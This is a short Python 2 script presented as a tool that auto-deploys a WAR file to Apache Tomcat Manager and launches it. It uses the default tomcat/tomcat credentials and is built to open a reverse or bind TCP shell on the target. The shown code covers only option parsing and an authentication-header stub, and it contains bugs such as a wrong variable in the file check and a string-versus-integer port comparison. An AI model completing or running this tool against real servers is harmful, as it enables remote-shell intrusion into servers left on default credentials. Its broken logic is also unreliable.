#!/usr/bin/python

import mechanize
import os
import sys
import optparse
import base64
import logging

logging.basicConfig(format='%(levelname)s: %(message)s', level=logging.INFO)

def options():
    print '\nApache Tomcat auto WAR deploy & launch tool\nMariusz B. / MGeeky \'16\n' 

    usage = '%prog [options] server'
    parser = optparse.OptionParser(usage=usage)

    general = optparse.OptionGroup(parser, 'General options')
    general.add_option('-v', '--verbose', dest='verbose', help='Verbose mode.')
    general.add_option('-U', '--user', metavar='USER', dest='user', default='tomcat', help='Tomcat Manager Web Application HTTP Auth username. Default="tomcat"')
    general.add_option('-P', '--pass', metavar='PASS', dest='password', default='tomcat', help='Tomcat Manager Web Application HTTP Auth password. Default="tomcat"')
    parser.add_option_group(general)

    payload = optparse.OptionGroup(parser, 'Payload options')
    payload.add_option('-H', '--host', metavar='RHOST', dest='host', default='0.0.0.0', help='Remote host for reverse tcp payload connection. When specified, RPORT must be specified too. Otherwise, bind tcp payload will be deployed, binded to 0.0.0.0 on target server.')
    payload.add_option('-p', '--port', metavar='RPORT', dest='port', default='4444', help='Remote port for the reverse tcp payload. When specified, RHOST must be specified too. Otherwise, bind tcp payload will be deployed, listening on port 4444')
    payload.add_option('-u', '--url', metavar='URL', dest='url', default='/manager/', help='Apache Tomcat management console URL. Default: /manager/')
    parser.add_option('-f', '--file', metavar='WARFILE', dest='file', help='Custom WAR file to deploy. By default the script will generate own WAR file on-the-fly.')

    opts, args = parser.parse_args()

    if (opts.host and not opts.port) or (opts.port and not opts.host):
        parser.error('Both RHOST and RPORT must be specified to deploy reverse tcp payload.')
        sys.exit(0)

    try:
        int(opts.port)
        if opts.port < 0 or opts.port > 65535:
            raise ValueError
    except ValueError:
        parser.error('RPORT must be an integer in range 0-65535')

    if opts.file and not os.path.exists(file):
        parser.error('Specified WAR file does not exists in local filesystem.')
        
    return (opts, args)

def browseToManager(url, user, password):
    browser = mechanize.Browser()
    browser.set_handle_robots(False)
    auth = base64.encodestring('%s:%s' % (user, password))
    browser.addheaders.append(('Authorization', 'Basic %s' % auth))

def main():
    (opts, args) = options()

    url = 'http://%s%s' % (args[0], opts.url)
    browseToManager(url, opts.user, opts.password)

if __name__ == '__main__':
    main()
